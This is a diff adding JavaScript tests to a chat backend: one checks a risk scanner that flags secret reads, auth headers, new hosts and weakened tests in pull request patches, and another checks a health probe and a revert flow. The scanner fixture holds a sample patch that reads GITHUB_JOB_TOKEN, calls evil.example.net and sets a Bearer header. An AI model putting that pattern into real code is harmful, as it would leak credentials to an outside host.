@@ -225,3 +225,47 @@ test('keyless providers answer anonymously, fixed free lists skip discovery, and
   assert.equal(summary.llm7.hasKey,true);assert.equal(JSON.stringify(summary).includes('"l"'),false,'keys never leave the Worker');
  }finally{globalThis.fetch=original}
 });
+
+test('risk scan flags secrets, auth, new hosts, program execution and weakened tests on added lines only',async()=>{
+ const {riskScan}=await import('../chat-backend/src/review.js');
+ const risks=riskScan([
+  {filename:'chat-backend/src/index.js',status:'modified',patch:'@@\n-const old=1;\n+const t=env.GITHUB_JOB_TOKEN;\n+await fetch("https://evil.example.net/x");\n+headers.Authorization="Bearer "+t;'},
+  {filename:'tests/test_core.py',status:'modified',patch:'@@\n-        self.assertEqual(a,1)\n-        self.assertTrue(b)\n+        pass'},
+  {filename:'tests/old.test.mjs',status:'removed'},
+  {filename:'preview/ui.js',status:'modified',patch:'@@\n-// fetch("https://evil.example.net") removed is fine\n+const label="Refresh";'}]);
+ const texts=risks.map(r=>r.text);
+ for(const t of ['Reads secrets or environment variables','Touches login, tokens or authorization','Contacts a web address not used before','Removes or weakens tests','Deletes a test file'])assert.ok(texts.includes(t),t);
+ assert.equal(risks[0].level,'high');
+ assert.equal(risks.some(r=>r.files.includes('preview/ui.js')),false,'removed lines are not flagged');
+ assert.deepEqual(riskScan([{filename:'preview/ui.js',status:'modified',patch:'@@\n+const label="Refresh";'}]),[]);
+});
+
+test('health probe is public and reveals no configuration; Undo restores the previous version exactly and can merge without new tests',async()=>{
+ const health=await worker.fetch(new Request('https://worker.test/health'),{MEMORY:{},CHAT_ACCESS_TOKEN:'secret-value'});
+ assert.equal(health.status,200);const body=await health.text();assert.match(body,/"ok":true/);assert.equal(body.includes('secret-value'),false);
+ assert.equal((await worker.fetch(new Request('https://worker.test/health'),{})).status,503);
+ const original=globalThis.fetch,calls=[],main='a'.repeat(40),before='b'.repeat(40),revert='c'.repeat(40);
+ globalThis.fetch=async(url,init={})=>{const u=String(url),method=init.method||'GET';calls.push({u,method,body:init.body});
+  if(u.includes('/user/repos'))return Response.json([{name:'KappaForge',owner:{login:'onlykappa'}}]);
+  if(u.endsWith('/commits/main'))return Response.json({sha:main,html_url:'https://github.com/c/'+main,commit:{message:'Add tooltip (#50)\n\nbody',tree:{sha:'tree-new'}},parents:[{sha:before}]});
+  if(u.endsWith('/commits/'+before))return Response.json({sha:before,commit:{tree:{sha:'tree-old'}},parents:[{sha:'d'.repeat(40)}]});
+  if(u.endsWith('/commits/'+main))return Response.json({sha:main,commit:{tree:{sha:'tree-new'}},parents:[{sha:before}]});
+  if(u.endsWith('/commits/'+revert))return Response.json({sha:revert,commit:{tree:{sha:'tree-old'}},parents:[{sha:main}]});
+  if(u.endsWith('/git/commits')&&method==='POST')return Response.json({sha:revert});
+  if(u.endsWith('/git/refs')&&method==='POST')return Response.json({ref:'x'});
+  if(u.endsWith('/pulls')&&method==='POST')return Response.json({number:60,html_url:'https://github.com/onlykappa/KappaForge/pull/60'});
+  if(u.endsWith('/pulls/60'))return Response.json({state:'open',title:'Undo: Add tooltip (#50)',body:'## What this does\nPuts it back.',mergeable:true,head:{ref:'kappa/revert-1700000000',sha:revert,repo:{full_name:'onlykappa/KappaForge'}},base:{repo:{full_name:'onlykappa/KappaForge'}}});
+  if(u.includes('/pulls/60/files'))return Response.json([{filename:'preview/ui.js',status:'modified',patch:'@@\n-const label="Refresh";'}]);
+  if(u.includes('sandbox-tests.yml/runs'))return Response.json({workflow_runs:[]});
+  return new Response(null,{status:204})};
+ const env={CHAT_ACCESS_TOKEN:'owner-token',GITHUB_JOB_TOKEN:'gh-undo'};
+ try{
+  const preview=await(await worker.fetch(req('/undo',{}),env)).json();
+  assert.equal(preview.title,'Add tooltip (#50)');assert.equal(calls.some(c=>c.method==='POST'),false,'preview writes nothing');
+  assert.equal((await worker.fetch(req('/undo',{confirmed:true,sha:'e'.repeat(40)}),env)).status,409,'stale preview refused');
+  assert.equal((await worker.fetch(req('/undo',{confirmed:true,sha:main}),env)).status,200);
+  const commit=JSON.parse(calls.find(c=>c.u.endsWith('/git/commits')).body);assert.equal(commit.tree,'tree-old');assert.deepEqual(commit.parents,[main]);
+  const review=await(await worker.fetch(req('/review',{repo:'KappaForge',prNumber:60}),env)).json();
+  assert.equal(review.restore,true);assert.equal(review.canMerge,true);assert.equal(review.tests.state,'none');assert.deepEqual(review.risks,[]);
+ }finally{globalThis.fetch=original}
+});
